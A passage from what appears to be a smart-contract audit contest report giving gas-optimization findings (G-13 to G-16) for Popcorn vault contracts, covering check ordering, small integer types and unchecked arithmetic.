257:    if (amount > 0) {
258:      if (rewardsPerSecond == 0) revert ZeroRewardsSpeed();
259:      rewardToken.safeTransferFrom(msg.sender, address(this), amount);
260:    }
```

The first check involves a  functional call which is expensive. As we also revert on a functional parameter (rewardsPerSecond) failure to pass a certain check (in this case , we revert if it's equal to zero) it would be way cheaper to reorder the if's cheak to have the cheap check for functional parameter before performing the more expensive ones.

### Move the functional parameter check to be the first operation
```solidity

296:  function changeRewardSpeed(IERC20 rewardToken, uint160 rewardsPerSecond) external onlyOwner {
297:    RewardInfo memory rewards = rewardInfos[rewardToken];

301:    if (rewards.rewardsPerSecond == 0) revert RewardsAreDynamic(rewardToken);

303:    _accrueRewards(rewardToken, _accrueStatic(rewards));
```

As we have a check for a  functional parameter, it is better to do that check first before anything else. This way we don't waste any gas if the function parameter does not the required condition . In the above function we shouldn't waste gas on `RewardInfo memory rewards = rewardInfos[rewardToken];` if we could end up reverting on ` if (rewardsPerSecond == 0) revert ZeroAmount();`

## [G-14] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead

When using elements that are smaller than 32 bytes, your contractâ€™s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.

https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html 

Use a larger size then downcast where needed

## [G-15] Using unchecked blocks to save gas

Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isnâ€™t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block.

[see resource](https://github.com/ethereum/solidity/issues/10695)

https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/yearn/YearnAdapter.sol#L151

```solidity
File: /src/vault/adapter/yearn/YearnAdapter.sol
151:        return _depositLimit - assets;
```
The operation `_depositLimit - assets` cannot underflow due to the check on [Line 150](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/yearn/YearnAdapter.sol#L150) that ensures that `_depositLimit` is greater than `assets` before performing the arithmetic operation

```solidity
File: /src/vault/adapter/abstracts/AdapterBase.sol
537:                    (shareValue - highWaterMark_) * totalSupply(),
```
The operation `shareValue - highWaterMark_` cannot underflow due to the check on [Line 535](https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/adapter/abstracts/AdapterBase.sol#L535) that ensures that `shareValue` is greater than `highWaterMark_` before performing the arithmetic operation.

## [G-16] Using unchecked blocks to save gas - Increments in for loop can be unchecked (save 30-40 gas per loop iteration)

The majority of Solidity for loops increment a uint256 variable that starts at 0. These increment operations never need to be checked for over/underflow because the variable will never reach the max number of uint256 (will run out of gas long before that happens). The default over/underflow check wastes gas in every iteration of virtually every for loop.
